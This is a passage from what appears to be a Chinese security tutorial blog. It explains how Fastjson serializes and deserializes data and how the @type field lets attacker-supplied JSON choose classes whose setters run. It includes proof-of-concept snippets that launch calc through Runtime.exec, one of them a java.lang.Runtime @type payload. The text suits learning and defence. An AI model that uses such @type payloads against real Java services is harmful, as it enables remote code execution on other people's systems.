    <content type="html"><![CDATA[<p>‍</p><h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse来分别实现序列化和反序列化操作。</p><h2 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h2><p>‍</p><p>定义的一个学生类，其中包含两个属性及其getter&#x2F;setter方法，还有类的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用JSON.toJsonString()来序列化Student类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        student.setAge(<span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span> JSON.toJSONString(student); <span class="hljs-comment">//, SerializerFeature.WriteClassName</span><br>        System.out.println(jsonstring);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130677.png" alt="image">​</p><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">xiaoming</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;zzzjjjjaaaacccckkkkkyyyy\&quot;&#125;&quot;</span>,Student.class);<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span>+xiaoming.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span>+xiaoming.getAge());<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130119.png" alt="image">​</p><p>其实这里的反序列化也很简单，我的序列化字符串经过JSON.parseObject()处理后会实例化我的Student类然后触发了构造函数，然后以此调用了set方法来给我们这个对象当中的属性进行赋值也就是单纯一个反序列化他就会这么执行</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130240.png" alt="image">​</p><p>这就是fastjson的反序列化</p><p>‍</p><p>那么这里就存在一个问题了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130380.png" alt="image">​</p><p>其实很好理解，就是我要反序列化的类的属性名跟json的key对应的字段名是一样的 ，所以就可以用直接类的映射来填入即可，name 跟age是类的属性名，json字符串也是name跟age</p><p>‍</p><h2 id="type是什么？"><a href="#type是什么？" class="headerlink" title="@type是什么？"></a>@type是什么？</h2><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130635.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot; &#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot; @type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;<br>            ParserConfig.getGlobalInstance().addAccept(<span class="hljs-string">&quot;java.lang&quot;</span>);<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) JSON.parseObject(json,<br>                    Object.class);<br>            runtime.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>            &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130794.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130042.png" alt="image">​</p><p>‍</p><h2 id="SerializerFeature-WriteClassName-序列化"><a href="#SerializerFeature-WriteClassName-序列化" class="headerlink" title="SerializerFeature.WriteClassName(序列化)"></a><span style="font-weight: bold;" data-type="strong">SerializerFeature.WriteClassName(序列化)</span></h2><p>在序列化的时候oJSONString()还有一个参数 叫<span style="font-weight: bold;" data-type="strong">SerializerFeature.WriteClassName </span></p><p>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter&#x2F;setter&#x2F;is方法。 Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130184.png" alt="image">​</p><p>如图</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        student.setAge(<span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName); <span class="hljs-comment">//</span><br>        System.out.println(jsonstring);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130325.png" alt="image">​</p><p>‍</p><h2 id="Feature-SupportNonPublicField-反序列化"><a href="#Feature-SupportNonPublicField-反序列化" class="headerlink" title="Feature.SupportNonPublicField(反序列化)"></a>Feature.SupportNonPublicField(反序列化)</h2><p>如果需要还原出private属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</p><p>啥意思呢？其实就是说它能够获取到私有变量的值</p><p>比如写如下demo</p><p>这里的age和name都是私有的，我们能通过刚才上述的JSON.parseObject(“{&quot;age&quot;:20,&quot;name&quot;:&quot;zzzjjjjaaaacccckkkkkyyyy&quot;}”,Student.class); 这个反序列化能够得到age是因为存在setage这个方法进行了设置，如果这里我吧setage方法删掉 看下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br><span class="hljs-comment">//    public void setAge(int age) &#123;</span><br><span class="hljs-comment">//        System.out.println(&quot;setAge&quot;);</span><br><span class="hljs-comment">//        this.age = age;</span><br><span class="hljs-comment">//    &#125;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里再进行一次反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">xiaoming</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;zzzjjjjaaaacccckkkkkyyyy\&quot;&#125;&quot;</span>,Student.class);<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span>+xiaoming.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span>+xiaoming.getAge());<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130480.png" alt="image">​</p><p>我们获取到的是 初始化的值 为0</p><p>但是这里我们加上  Feature.SupportNonPublicField 即可获得该私有变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">xiaoming</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;zzzjjjjaaaacccckkkkkyyyy\&quot;&#125;&quot;</span>,Student.class, Feature.SupportNonPublicField);<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span>+xiaoming.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span>+xiaoming.getAge());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130656.png" alt="image">​</p><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p><p>‍</p><h2 id="反序列化时几种类型设置的比较"><a href="#反序列化时几种类型设置的比较" class="headerlink" title="反序列化时几种类型设置的比较"></a>反序列化时几种类型设置的比较</h2><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异</p><p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化</p><p>如下demo</p><p>Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String address;<br>    <span class="hljs-keyword">private</span> String sex;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAddress&quot;</span>);<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getsex</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getsex&quot;</span>);<br>        <span class="hljs-keyword">return</span> sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我序列化出来的值为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;fastjson.Student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">20</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;zjacky&quot;</span>,<span class="hljs-string">&quot;sex&quot;</span>:<span class="hljs-string">&quot;男&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="未设置Feature-SupportNonPublicField"><a href="#未设置Feature-SupportNonPublicField" class="headerlink" title="未设置Feature.SupportNonPublicField"></a>未设置Feature.SupportNonPublicField</h5><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerFJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.Student\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;zjacky\&quot;,\&quot;sex\&quot;:\&quot;男\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130840.png" alt="image">​</p><p>‍</p><h5 id="设置Feature-SupportNonPublicField"><a href="#设置Feature-SupportNonPublicField" class="headerlink" title="设置Feature.SupportNonPublicField"></a>设置Feature.SupportNonPublicField</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerFJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.Student\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;zjacky\&quot;,\&quot;sex\&quot;:\&quot;男\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出，发现和未设置Feature.SupportNonPublicField的是一致的：</p><h2 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h2><p>根据前面的结果，有如下结论：</p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>​形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>​形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>​形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>​形式得到的都是特定的Student类；</li></ul><p>‍</p><h2 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h2><p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj); <br> <br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parse();  <span class="hljs-comment">//解析为JSONObject类型或者JSONArray类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>);  <span class="hljs-comment">//JSON文本解析成JSONObject类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class);  <span class="hljs-comment">//JSON文本解析成VO.class类</span><br></code></pre></td></tr></table></figure><p>可以推测出在反序列化过程中，会<code>parse()</code>​先调用@type标识的类的构造函数，然后再调用setter给对象赋值。</p><p>而parseObject()方法会同时调用所有的setter和getter</p><p>‍</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><p>‍</p><h2 id="getter-setter条件"><a href="#getter-setter条件" class="headerlink" title="getter setter条件"></a>getter setter条件</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130997.png" alt="image">​</p><p>‍</p><h2 id="如何才能够反序列化出恶意类呢"><a href="#如何才能够反序列化出恶意类呢" class="headerlink" title="如何才能够反序列化出恶意类呢"></a><span style="font-weight: bold;" data-type="strong">如何才能够反序列化出恶意类呢</span></h2><p>由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>​就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><p>‍</p><p>看如下案例 一个java bean类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">public</span> String calc;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造函数&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCalc</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getter&quot;</span>);<br>        <span class="hljs-keyword">return</span> calc;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCalc</span><span class="hljs-params">(String calc)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.calc = calc;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;调用了setter&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerFJTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title 